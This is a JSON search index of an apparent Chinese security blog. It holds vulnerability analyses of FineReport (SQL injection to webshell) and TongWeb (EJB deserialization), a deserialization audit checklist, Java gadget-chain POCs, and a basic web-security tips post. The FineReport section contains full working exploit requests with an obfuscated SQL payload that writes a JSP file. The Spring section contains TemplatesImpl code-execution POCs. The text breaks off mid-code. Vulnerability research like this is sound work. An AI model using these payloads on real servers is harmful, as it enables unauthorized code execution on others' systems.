[{"title":"测试图片显示","url":"/2025/12/31/test-image/","content":"\n这是一个测试图片显示的文章。\n\n![测试图片1](/resources/13464947a8d54db7b6323cc805ecea78.png)\n\n测试完成。\n","tags":["test"],"categories":["测试"]},{"title":"加密测试文章","url":"/2025/12/30/encrypted-test-post/","content":"\n# 这是加密文章的内容\n\n恭喜你成功解密了这篇文章！\n\n## 加密功能测试\n\n这篇文章用于测试 hexo-blog-encrypt 插件的加密功能。\n\n### 功能特点\n\n1. 文章内容在未输入正确密码前不可见\n2. 密码输入界面与暗色主题风格一致\n3. 在文章列表中显示加密标识图标\n4. 支持会话级别的密码记忆\n\n### 代码示例\n\n```javascript\n// 这是一段测试代码\nfunction secretFunction() {\n  console.log('这是加密内容中的代码');\n  return 'secret';\n}\n```\n\n### 结语\n\n如果你能看到这些内容，说明加密和解密功能正常工作！\n","tags":["加密","测试"],"categories":["测试"]},{"title":"Web Security Best Practices","url":"/2025/12/27/web-security-best-practices/","content":"\nEssential security practices every web developer should follow.\n\n## Input Validation\n\nAlways validate and sanitize user input:\n\n```javascript\n// Bad - vulnerable to XSS\nfunction displayUserInput(input) {\n  document.getElementById('output').innerHTML = input;\n}\n\n// Good - sanitize input\nfunction displayUserInput(input) {\n  const sanitized = input\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/\"/g, '&quot;')\n    .replace(/'/g, '&#x27;');\n  document.getElementById('output').textContent = sanitized;\n}\n```\n\n## SQL Injection Prevention\n\nUse parameterized queries:\n\n```python\n# Bad - vulnerable to SQL injection\ndef get_user(username):\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    return db.execute(query)\n\n# Good - use parameterized queries\ndef get_user(username):\n    query = \"SELECT * FROM users WHERE username = ?\"\n    return db.execute(query, (username,))\n```\n\n## Password Security\n\nHash passwords properly:\n\n```python\nimport bcrypt\n\n# Hashing a password\ndef hash_password(password):\n    salt = bcrypt.gensalt()\n    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)\n    return hashed\n\n# Verifying a password\ndef verify_password(password, hashed):\n    return bcrypt.checkpw(password.encode('utf-8'), hashed)\n```\n\n## HTTPS and Secure Headers\n\nAlways use HTTPS and set security headers:\n\n```javascript\n// Express.js example\nconst helmet = require('helmet');\napp.use(helmet());\n\n// Set custom headers\napp.use((req, res, next) => {\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n  res.setHeader('X-Frame-Options', 'DENY');\n  res.setHeader('X-XSS-Protection', '1; mode=block');\n  next();\n});\n```\n\n## CSRF Protection\n\nImplement CSRF tokens:\n\n```javascript\n// Generate CSRF token\nconst csrf = require('csurf');\nconst csrfProtection = csrf({ cookie: true });\n\napp.get('/form', csrfProtection, (req, res) => {\n  res.render('form', { csrfToken: req.csrfToken() });\n});\n\napp.post('/process', csrfProtection, (req, res) => {\n  // Process form\n});\n```\n\nSecurity is not optional - make it a priority from day one!\n","tags":["Security","Best Practices","Web Development"],"categories":["Security","Web Development"]},{"title":"帆软FineReport Export/excel 未授权SQL注入致远程代码执行漏洞","url":"/2025/12/20/帆软FineReport-Export-excel-未授权SQL注入致远程代码执行漏洞/","content":"帆软FineReport Export/excel 未授权SQL注入致远程代码执行漏洞\n\n官方给的接口是 export/excel，且说了问题出在 LargedsExcelExport 这个模块里，帆软v11 web 端架构并不复杂，可通过注解 `@RequestMapping` 快速锁定相关路由。用 Jadx 搜一下，发现大部分路由都位于`com.fr.nx.app.web.controller.NXController`。\n\n<img src=\"/resources/13464947a8d54db7b6323cc805ecea78.png\" alt=\"d1986651344e1a603a92f8f2e9e23c27.png\" width=\"774\" height=\"306\">\n\n跟进到`com.fr.nx.app.web.controller.NXController#largedsExcelExportV9`，重点关注初始化方法`initCreator`。\n\n![254aa8d33b3366955492da97c3569b2d.png](/resources/e0a12bf8ed824dc0ba2a1b45bd39f56c.png)\n\n首先获取一个参数`__parameters__`，这个参数不关键，默认为{}。\n\n之后会进入`getEntity`方法，该方法需要读取第二个参数`params`，然后通过`createXMLableReader`方法自定义一个xml格式数据来还原对象。\n\n<img src=\"/resources/180b13b91af64bfc898e36a8fa084513.png\" alt=\"feb5184c9bc7bbb32f4c56a958ee4be4.png\" width=\"731\" height=\"263\">\n\n仿照其构造一个，格式如下：\n\n![bbc6cf5ded3f8b6edb4ded56d0a1cf54.png](/resources/01d3b5d50727422699e76a99b85ba49e.png)\n\n回到`getEntity`方法，程序继续执行会进入`dealParam`。\n\n![10d1648b0baf4743d18336b64b699916.png](/resources/0b164bd922534eea80ecc92882c5cf6a.png)\n\n这里需要第三个参数`functionParams`，同样默认为json。这里着重注意下，传入的`LargeDatasetExcelExportJavaScript`类型变量获取了其中`<Parameters>`下的每一个`<Parameter>`，执行了`var25 = var2.evalValue(String.valueOf(var17.getValue()));`操作。\n\n这个方法不是第一次爆洞了，简单来说就是其中可以执行帆软定义的一些函数。而帆软报表默认使用Sqlite作为数据库引擎，并且默认存在数据库FRDemo，因此可以执行SQL语句。\n\n![c53fdfe0f633ce998219e4208191c8d5.png](/resources/663baf5273c3433f8630f63aadd301b7.png)\n\n在执行SQL前，会调用`JDBCSecurityChecker.checkQuery`方法对SQL进行安全检查。跟进`checkQuery`方法，该方法做了一个黑名单检测，如果匹配到`InsecurityElement`对应的关键字，则报错退出。\n\n![24914a06c571d240990bf19d4cdcc311.png](/resources/6a962ebb2b14418b95342155cac2086f.png)\n\n也就是说，现在需要绕过SQL安全检测限制并实现webshell落地，目前已知可用的SQL注入路径如下：（由于默认的数据库里数据太多写入的shell无法解析，所以我们要先清空FRDemo数据库）：\n\n```sql\nPRAGMA writable_schema=ON;\nDELETE FROM sqlite_schema WHERE name='sqlite_stat1';\nANALYZE;\nREPLACE INTO sqlite_stat1 VALUES ('', '<JSP_PAYLOAD>', '');\nVACUUM INTO (ENV_HOME/../../92ccC9AC.jsp);\n```\n\nPOC如下：\n\n```\nGET /webroot/ReportServer?viewlets=[{'reportlet':'/'}] HTTP/1.1\nHost: 10.211.55.3:8075\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nop: getSessionID\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nConnection: keep-alive\n\n\n```\n\n```\nGET /webroot/decision/nx/report/v9/largedataset/export/excel?functionParams=%7B%7D&__parameters__=%7B%7D HTTP/1.1\nHost: 10.211.55.3:8075\nAccept-Encoding: gzip, deflate\nAccept: */*\nsessionID: 118b5fb1-596e-45cb-93b0-692ceb30641e\nparams: %3Cpd%3E%0A+%3CLargeDatasetExcelExportJS+dsName%3D%221%22%3E%0A%3CParameters%3E%3CParameter%3E%0A%3CAttributes+name%3D%22c%22%2F%3E%3CO+t%3D%22Formula%22%3E%3CAttributes%3E%3C%21%5BCDATA%5Bsql%28%27FRDemo%27%2CCONCATENATE%28%22pr%22%2C%22agm%22%2C%22a+wr%22%2C%22i%22%2C%22t%22%2C%22a%22%2C%22ble%22%2C%22_sch%22%2C%22e%22%2C%22ma%3Do%22%2C%22n%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22dele%22%2C%22t%22%2C%22e+f%22%2C%22r%22%2C%22o%22%2C%22m+sq%22%2C%22li%22%2C%22t%22%2C%22e_sc%22%2C%22he%22%2C%22ma+w%22%2C%22here%22%2C%22+na%22%2C%22m%22%2C%22e%21%22%2C%22%3D%22%2C%22%27s%22%2C%22ql%22%2C%22ite%22%2C%22_s%22%2C%22ta%22%2C%22t%22%2C%221%27%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22an%22%2C%22aly%22%2C%22ze%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22re%22%2C%22p%22%2C%22lac%22%2C%22e+i%22%2C%22nto%22%2C%22+s%22%2C%22ql%22%2C%22ite_%22%2C%22st%22%2C%22at%22%2C%221+va%22%2C%22lu%22%2C%22es%28%27%22%2C%22%27%2C%27%3C%25+out.println%28new+String%28new+sun.misc.BASE64Decoder%28%29.decodeBuffer%28%5C%22Zjc5NjUxODQ4NDAyY2JmZmI3MWNmNGMwYWYyNzU0NzE%3D%5C%22%29%29%29%3B+new+java.io.File%28application.getRealPath%28request.getServletPath%28%29%29%29.delete%28%29%3B+%25%3E%22%2C%22%27%22%2C%22%2C%27%27%29%22%29%2C1%29-sql%28%27FRDemo%27%2CCONCATENATE%28%22V%22%2C%22A%22%2C%22C%22%2C%22U%22%2C%22U%22%2C%22M%22%2C%22+i%22%2C%22nt%22%2C%22o%28%27%22%2CENV_HOME%2C%22%2F%22%2C%22.%22%2C%22.%22%2C%22%2F%22%2C%22.%22%2C%22%2F%22%2C%2292ccC9AC%22%2C%22.%22%2C%22j%22%2C%22s%22%2C%22p%22%2C%22%27%29%22%29%2C1%29%5D%5D%3E%3C%2FAttributes%3E%3C%2FO%3E%3C%2FParameter%3E%3C%2FParameters%3E%3C%2FLargeDatasetExcelExportJS%3E%3C%2Fpd%3E\n```\n\n![abf87ef9964f396b3ab50677399b690e.png](/resources/e8c4e39e2c6b44f2a21c70dda2db8f17.png)","tags":["vulnerability","Java"],"categories":["漏洞分析"]},{"title":"反序列化漏洞审计流程","url":"/2025/11/13/反序列化漏洞审计流程/","content":"\n## 一、分析补丁\n\n确定url、初步分析改动代码、确定所在服务和端口（越来越多的漏洞出现在非web端口上，这种漏洞往往更不容易被挖出来。）\n\n## 二、整理源码\n\n把所有jar包都搞到一个文件夹里再添加为库。如果需要文本搜索尽量用jadx，不要用idea。\n\n资源文件收集（properties、xml、META-INF等）\n\n整理路由（[https://github.com/ax1sX/RouteCheck-Alpha）](https://github.com/ax1sX/RouteCheck-Alpha%EF%BC%89)\n\n## 三、入口点\n\n**信息收集：io.github.classgraph**\n\n入口点往往与路由绑定，如果未绑定且补丁中无法跟踪到真实入口点，则通过上面工具查找HttpServlet的实现类。\n\n## 四、序列化\n\n`java.io.Externalizable`和`java.io.Serializable`两个主要的序列化接口\n\n`readExternal`和`readObject`两个主要的反序列化方法\n\n组件往往有自己的反序列化方式，需要根据代码自己构建序列号数据。\n\n## 五、Gadget\n\n根据依赖去查询可能存在的Gadget，例如Commons-Collections、xbean、Commons-BeanUtils、Fastjson、Xstream、spring-beans、hessian等等等等。\n\n如果项目完全没有引入高危依赖，也不能说明一定不受反序列化漏洞的影响，如果确定有漏洞，则应该着重从JDK自带的gadget入手。\n\n- `javax.management.BadAttributeValueExpException`\n\n- `sun.rmi.*`\n\n- `java.util.PriorityQueue`\n\n- `java.lang.reflect.InvocationHandler`\n\nGadget链子往往都是现成的，链子的学习应该放在日常，分析漏洞时往往不需要深挖调用链，只要能找source点~~和sink点~~就行。\n\n熟练使用ysoerial (https://github.com/frohoff/ysoserial) 和Java-chain (https://github.com/vulhub/java-chains)。\n\nysoerial很多大牛都在原版的基础上进行了fork，可以积累一些遇到了直接用。https://github.com/Y4er/ysoserial/https://github.com/unam4/yso-mysqlpipe\n\nJava-chain往往可以作为知识库来用，或者反编译Java-chain自己拼好链。。。。","tags":["vulnerability","Java","deserialization"],"categories":["攻击技术"]},{"title":"TongWeb ejb服务反序列化致远程代码执行漏洞分析","url":"/2025/09/30/TongWeb-ejb服务反序列化致远程代码执行漏洞分析/","content":"\n近期TongWeb发布了一个安全加固说明，提示 EJB 远程服务存在反序列化风险，作为一个很久没爆新洞的老牌中间件厂商，一下子出来个未授权RCE，肯定是要分析一波。\n\n看下官方通告，漏洞是出现在 EJB 服务的 ejbserver 接口，而不是 WEB 服务里。可能正因如此，这个漏洞才能存在如此之久，直至最近才被披露。（By the way，近期披露高危漏洞越来越多地出现在非面向用户的HTTP服务上，可能主API端点已经被挖烂了很难出成果，把视线转移到这些冷门生僻不常用的开放端口里）\n\n![da940163f79d12e3ff156ca1202e87ef.png](/resources/9732657c38e14563b6297e2f9a289d1d.png)\n\n先看下TongWeb默认开启了哪些对外端口。再信息收集一波，漏洞不是在8088就是在5100。\n\n<img src=\"/resources/9cee0e94a67a4274a6e3407eb7b5d98d.png\" alt=\"aeae98f6cb07bc2a66c7111d7835fa0b.png\" width=\"709\" height=\"228\" class=\"jop-noMdConv\">\n\n <img src=\"/resources/c319ba01c90149a6988c08daeb02957a.png\" alt=\"521c9e3a08945eaf3ede18c5cb7f276c.png\" width=\"702\" height=\"194\" class=\"jop-noMdConv\">\n\n接口差不多确定后就可以找下路由，由于官方已经发了在 ejbserver 接口下，所以关键词检索找下，最后在 catalina 里确定了路由为`/ejbserver/ejb`。确定路由接口了，再随便向8088跟5100发送些序列化数据，可以确定端口为8088。\n\n![ca9a32c8bd9b28f3da1088b983ca1407.png](/resources/90ee795ab7d54a7aaf9aae7fabb02131.png)\n\n接下来看下补丁，TongWeb官方还是比较实诚的，把漏洞所在类已经写清楚了。\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n<patchDescriptor>\n    <id>TW7030-TW7049M4_ITAIT-7010</id>\n    <sharedArchiveDesc>\n        <rule>\n            <name>update</name>\n            <value>com/tongweb/tongejb/server/httpd/ServerServlet.class</value>\n        </rule>\n        <src>media/lib/tongweb.jar</src>\n        <dest>lib/tongweb.jar</dest>\n    </sharedArchiveDesc>\n</patchDescriptor>\n\n```\n\n持续跟进 service 方法，最后会跟到`com.tongweb.tongejb.server.ejbd.EjbDaemon#service`下。\n\n<img src=\"/resources/0941eb8109b5453bbe97d9fe36c0bcd6.png\" alt=\"0516d7d777941cb62446b3321c4de750.png\" width=\"694\" height=\"320\" class=\"jop-noMdConv\">\n\n可以看到原始输入流经过了两次自定义的`readExternal`，第一次是对输入流的协议头有格式要求，必须匹配正则`^OEJP/[0-9].[0-9]$`，第二次则是要求输入流写入一个字节的值1。\n\n<img src=\"/resources/a103505d0a594ceb94a3b0cd366d9205.png\" alt=\"5a6b8d7aa3a680b5ea05ae7922251d25.png\" width=\"779\" height=\"127\" class=\"jop-noMdConv\"> <img src=\"/resources/4d5afdb5126f44bc9118fd1b2cdaed67.png\" alt=\"112cda267867fe74fa1a3d78f271c81f.png\" width=\"729\" height=\"200\" class=\"jop-noMdConv\">\n\n那么我们就已经确定了Tongweb的反序列化方式，那么接下来只需要找一条可调用的Gadget链子就行了。\n\n先检查下其依赖，第一眼就能看到`commons-beanutils-core-1.8.3.jar`，而且TongWeb有一个老洞就是用CB链，顺其自然用CB183打一波发现失败了，找原因发现是并没有引入`org.apache.commons.beanutils.BeanComparator`包。继续检查发现`xbean-naming-4.5.jar`，而且众所周知，TongWeb就是照着TomCat改的，那么TomCat存在的问题TongWeb也大概率存在，因此可以想到利用`BadAttributeValueExpExceptionToString->XBeanToString->TomcatElRef`\n\n找了一下果然发现TongWeb原封不动的“借鉴”了Tomcat的`BeanFactory`，只不过改了个包名`com.tongweb.naming.factory.BeanFactory`。那么就可以用别人写好的payload试着构造下。https://github.com/unam4/yso-mysqlpipe/blob/main/src/main/java/ysoserial/payloads/XbeanWithBeanFactory.java\n\n引入TongWeb的依赖，并把factory的名字改掉。\n\n<img src=\"/resources/320d5bc27a9d4cca9328d1ce4c7f2e80.png\" alt=\"939407b7ee2fb682e2309024930ac593.png\" width=\"802\" height=\"542\" class=\"jop-noMdConv\">\n\n理论上就ok了，但是结果发现还是失败。。。。百思不得其解最后才发现是表达式注入里的payload用的base64类TongWeb没有。。。换成TongWeb自己的base64类终于执行成功。\n\n<img src=\"/resources/f39d9afedc4e435f9e05e54b2f213948.png\" alt=\"61fabd59883f1e57f93abb3dfb8d00f1.png\" width=\"812\" height=\"300\" class=\"jop-noMdConv\">\n\n<img src=\"/resources/45e6353986fb47a592d91954c4e74139.png\" alt=\"5247fc077e703dfb343bc1a6b7f33c85.png\" width=\"780\" height=\"275\" class=\"jop-noMdConv\">","tags":["vulnerability","Java","反序列化"],"categories":["漏洞分析"]},{"title":"JDK17下的Spring原生反序列化链","url":"/2025/06/30/JDK17下的Spring原生反序列化链/","content":"\n## 一、前置依赖\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n​\n    <groupId>com.suctf</groupId>\n    <artifactId>Spring</artifactId>\n    <version>1.0-SNAPSHOT</version>\n​\n    <properties>\n        <maven.compiler.source>17</maven.compiler.source>\n        <maven.compiler.target>17</maven.compiler.target>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n    </properties>\n​\n    <dependencies>\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-web</artifactId>\n            <version>3.5.4</version>\n        </dependency>\n​\n        <dependency>\n            <groupId>org.javassist</groupId>\n            <artifactId>javassist</artifactId>\n            <version>3.30.2-GA</version>\n        </dependency>\n    </dependencies>\n</project>\n```\n\n## 二、前置知识\n\n### 1. 不继承`AbstractTranslet`的`TemplatesImpl`恶意类\n\n`TemplatesImpl` 类实现了 `javax.xml.transform.Templates` 接口，用于表示已编译的 XSLT 模板，实现了 `java.io.Serializable` 代表可被反序列化。`TemplatesImpl` 类中存在一个 `getTransletInstance()` 方法会将 `_class` 数组下标为 `_transletIndex` (即-1)的值实例化，如果该数组及下标值可控，则我们可以执行任意代码。\n\n<img src=\"/resources/8ee69ad80d49481899c065260bdd3588.png\" alt=\"4135caa0b624b42d879113d9d5025eb1.png\" width=\"942\" height=\"452\" class=\"jop-noMdConv\">\n\n至于其详细利用条件和触发过程，这里就不详细展开了，网上有很多分析文章。完整POC如下：\n\n```java\npackage com.anbai.sec.unsafe;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\nimport java.lang.reflect.Field;\n\n\npublic class TemplatesImplGarget {\n    public static void main(String[] args) throws Exception {\n        ClassPool classPool = ClassPool.getDefault();   // 获取CtClass容器\n        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); // 引入AbstractTranslet路径到classpath中\n        CtClass testCtClass = classPool.makeClass(\"TestCtClass\");   // 创建CtClass对象\n        testCtClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));    // 设置父类为AbstractTranslet\n        CtConstructor ctConstructor = testCtClass.makeClassInitializer();   // 创建空初始化构造器\n        ctConstructor.insertBefore(\"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\"); // 插入初始化语句\n        byte[] bytes = testCtClass.toBytecode();    // 获取字节数据\n        TemplatesImpl templates = new TemplatesImpl();\n        //Reflections.setFieldValue(templates, \"_bytecodes\", new byte[][]{bytes});\n        Field bytecodesField = TemplatesImpl.class.getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        bytecodesField.set(templates, new byte[][]{bytes});\n        //Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        Field tfactoryField = TemplatesImpl.class.getDeclaredField(\"_tfactory\");\n        tfactoryField.setAccessible(true);\n        tfactoryField.set(templates, new TransformerFactoryImpl());\n        //Reflections.setFieldValue(templates, \"_name\", \"seizer\");\n        Field serzerField = TemplatesImpl.class.getDeclaredField(\"_name\");\n        serzerField.setAccessible(true);\n        serzerField.set(templates,\"hahah\");\n//        templates.newTransformer();\n        templates.getOutputProperties();\n    }\n}\n```\n\n使用 `TemplatesImpl` 实现了简单的任意字节码加载。其中的一个条件是 JavaClass 必须继承 `AbstractTranslet` 类。那么如果我们的JavaClass还需要继承其他类，就没办法了。所以需要尝试绕过这个限制。\n\n已知实例化恶意类之前会先调用`defineTransletClasses()`方法\n\n<img src=\"/resources/f8b2143e73f741fa823fa31c71f66b67.png\" alt=\"c30c8c45ae339c490add6e9b5a36159a.png\" width=\"715\" height=\"419\" class=\"jop-noMdConv\">\n\n我们跟进到`defineTransletClasses()`方法，已知我们目标是恶意类不继承`AbstractTranslet`类，那么就会存在几个需要满足的前置条件。\n\n首先，\\_tfactory不能为空，通过反射设置为 `TransformerFactoryImpl` 实例对象。但是理论上 `_tfactory` 这个字段是被 `transient` 修饰的，并不参与序列化过程。\n\n其次，在check if this is the main class过程就必定会进入else中。那么就没办法修改默认的`_transletIndex`为0了，所以需要手动设置值为0及以上。\n\n最后，当类不继承 `AbstractTranslet` 时，会向 `_auxClasses` 中 put 数据，因此还需要保证 `_auxClasses` 不为空。因此需要实例化 `_auxClasses`。在代码前面有一个判断，当 `classCount` 大于 1 时，即 `_bytecodes` 传入多个类时会将 `_auxClasses` 赋值为 HashMap。因此我们可以传入两个JavaClass从而给`_auxClasses`赋值。\n\n<img src=\"/resources/f7311711fae445b3999f6fc892cf6e89.png\" alt=\"edd2fc016193ab234a3e745c37286e58.png\" width=\"861\" height=\"535\" class=\"jop-noMdConv\">\n\n因此就可以着手构造我们的POC：\n\n```java\npackage ysoserial.xxx;\n\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport ysoserial.payloads.util.ClassFiles;\nimport ysoserial.payloads.util.Reflections;\nimport javassist.*;\n\nimport java.io.Serializable;\n\npublic class Without_AbstractTranslet {\n    public static void main(String[] args) throws Exception {\n//        payload1();\n        payload2();\n    }\n\n    public static void payload2() throws Exception {\n        byte[] code1 = getTemplateCode();\n        byte[] code2 = ClassPool.getDefault().makeClass(\"xxx\").toBytecode();\n        TemplatesImpl templates = new TemplatesImpl();\n        Reflections.setFieldValue(templates, \"_bytecodes\",new byte[][]{code1, code2});\n        Reflections.setFieldValue(templates, \"_name\", \"anyStr\");\n        Reflections.setFieldValue(templates, \"_transletIndex\", 0);\n        Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        templates.getOutputProperties();\n    }\n    public static byte[] getTemplateCode() throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        CtClass template = pool.makeClass(\"MyTemplate\");\n        String block = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        template.makeClassInitializer().insertBefore(block);\n        return template.toBytecode();\n    }\n\n}\n\n```\n\n### 2\\. EventListenerList触发toString\n\n`UndoManager`类，它实现了`UndoableEditListener`接口。而`UndoableEditListener`接口又继承了`EventListener`类。\n\n<img src=\"/resources/7db0ed6cf48241d293be7195ce45906f.png\" alt=\"2aedfccd1dfc1870022e94d847500717.png\" width=\"748\" height=\"138\" class=\"jop-noMdConv\"> <img src=\"/resources/97b554c100a049d6a7ba1dad0de83aab.png\" alt=\"79fe58011ed4dda244ebf23f3722af70.png\" width=\"621\" height=\"135\" class=\"jop-noMdConv\">\n\n回来看`UndoManager`类也继承了`CompoundEdit`类，向上继承了`AbstractUndoableEdit`类，这个类继承了`Serializable`接口。\n\n链子的入口点位于`javax.swing.event.EventListenerList#readObject`，需要是能够强制转换为 `EventListener` 类型，并且实现 Serializable 接口的类。显然`UndoManager`类满足这个条件。\n\n<img src=\"/resources/93a001d932d541ec9ca2060fdff13caf.png\" alt=\"a6d06e6e80f6b76c7c258a094b7a40ea.png\" width=\"744\" height=\"348\" class=\"jop-noMdConv\">\n\n跟进`UndoManager`类`toString`方法，发现两个变量都是string类型，所以看跟进其super方法，发现有一个edit变量为`Vector`类，观察`Vector`类的toString方法，发现会直接有经典的`toString`方法。\n\n<img src=\"/resources/1774b6258b634ffdaf2e47e70673cf54.png\" alt=\"da1ffaeb1c63bfb125a1e7417c099b83.png\" width=\"703\" height=\"148\" class=\"jop-noMdConv\"> <img src=\"/resources/915f3c01adda4521afeeba6dba91b925.png\" alt=\"c88c4087ca17048989920c36a93e72a8.png\" width=\"751\" height=\"75\" class=\"jop-noMdConv\">\n\n跟进到`Vector#toString`，发现其直接调用父类的方法，继续跟进，到了`AbstractCollection.toString`：\n\n<img src=\"/resources/0c2d298635d64d959e0e50d680780c8e.png\" alt=\"4a90c61c27a3fbca8da415d34b4e4725.png\" width=\"765\" height=\"305\" class=\"jop-noMdConv\">\n\n这里新建了一个迭代器，把对象传递给`StringBuilder.append`方法，我们可以通过`Vector.add`方法把恶意类添加进去。`append`方法调用了`valueOf`方法，其中传入参数是一个Object类型，就实现任意`toString`方法的调用了。\n\n<img src=\"/resources/df2acf7a80314e6f8ed36957f45a498e.png\" alt=\"1d570f252a0b017f5b980d0d49b9bcb2.png\" width=\"788\" height=\"117\" class=\"jop-noMdConv\">\n\n完整POC如下：\n\n```java\npackage ysoserial.xxx;\n\nimport com.alibaba.fastjson.*;\nimport javax.management.BadAttributeValueExpException;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.Base64;\nimport java.util.HashMap;\nimport java.util.Vector;\nimport javax.swing.event.EventListenerList;\n\n\nimport javax.swing.undo.UndoManager;\n\npublic class EventListenerListPayload{\n    public static void main(String[] args) throws Exception {\n        User u = new User(\"Infernity\");\n        //EventListenerList eventListenerList = getEventListenerList(u);\n        EventListenerList list = new EventListenerList();\n        UndoManager undomanager = new UndoManager();\n        Vector vector = (Vector) getFieldValue(undomanager, \"edits\");\n        vector.add(u);\n        setValue(list, \"listenerList\", new Object[]{Class.class, undomanager});\n        String a = serialize(list);\n        unserialize(a);\n    }\n\n    public static EventListenerList getEventListenerList(Object obj) throws Exception{\n        EventListenerList list = new EventListenerList();\n        UndoManager undomanager = new UndoManager();\n\n        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。\n        Vector vector = (Vector) getFieldValue(undomanager, \"edits\");\n        vector.add(obj);\n\n        setValue(list, \"listenerList\", new Object[]{Class.class, undomanager});\n        return list;\n    }\n    //反射改值\n    public static void setValue(Object obj, String name, Object value) throws Exception{\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n\n    //获取已实例化类中的值\n    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {\n        final Field field = getField(obj.getClass(), fieldName);\n        return field.get(obj);\n    }\n\n    public static Field getField( final Class<?> clazz, final String fieldName ) throws Exception {\n        try {\n            Field field = clazz.getDeclaredField(fieldName);\n            if (field != null)\n                field.setAccessible(true);\n            else if (clazz.getSuperclass() != null)\n                field = getField(clazz.getSuperclass(), fieldName);\n\n            return field;\n        } catch (NoSuchFieldException e) {\n            if (!clazz.getSuperclass().equals(Object.class)) {\n                return getField(clazz.getSuperclass(), fieldName);\n            }\n            throw e;\n        }\n    }\n\n    //提供需要序列化的类，返回base64后的字节码\n    public static String serialize(Object obj) throws IOException {\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);\n        objectOutputStream.writeObject(obj);\n        String poc = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());\n        return poc;\n    }\n\n    //提供base64后的字节码，进行反序列化\n    public static void unserialize(String exp) throws IOException,ClassNotFoundException{\n        byte[] bytes = Base64.getDecoder().decode(exp);\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);\n        objectInputStream.readObject();\n    }\n}\n\n```\n\n### 3. Jackson原生反序列化\n\n`Spring`中默认包含`Jackson`依赖。而`Jackson`存在一条将bean对象中的所有的属性的getter方法进行调用的链子。主要思路是通过依次掉用`BaseJsonNode#toString -> InternalNodeMapper#nodeToString -> ObjectWriter.writeValueAsString`方法实现经典Jackson反序列化链。又由于`BaseJsonNode`类是抽象类，用将其作为父类的`POJONode`类进行利用。\n\n<img src=\"/resources/7309c5f5743e40f5add535f481dbb382.png\" alt=\"e3c3d5e1b379a04bdd9ff388dfbed734.png\" width=\"536\" height=\"270\" class=\"jop-noMdConv\">\n\n完整POC如下：\n\n```java\npackage ysoserial.xxx;\n\n\nimport com.fasterxml.jackson.databind.node.POJONode;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\n\nimport javax.management.BadAttributeValueExpException;\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\nimport javassist.*;\nimport ysoserial.payloads.util.Reflections;\n\npublic class Jackson_POJONode {\n    public static byte[] getTemplateCode() throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        CtClass template = pool.makeClass(\"MyTemplate\");\n        String block = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        template.makeClassInitializer().insertBefore(block);\n        return template.toBytecode();\n    }\n    public static void main(String[] args) throws Exception {\n        //删除BaseJsonNode类中的wirteReplace方法\n        ClassPool pool = ClassPool.getDefault();  //创建Javassist的类池对象，用于加载和管理目标类的字节码\n        CtClass jsonNode = pool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");  //从类池中获取BaseJsonNode类的CtClass对象，允许后续修改其字节码\n        CtMethod writeReplace = jsonNode.getDeclaredMethod(\"writeReplace\");  //通过Java反射获取到writeReplace方法\n        jsonNode.removeMethod(writeReplace);  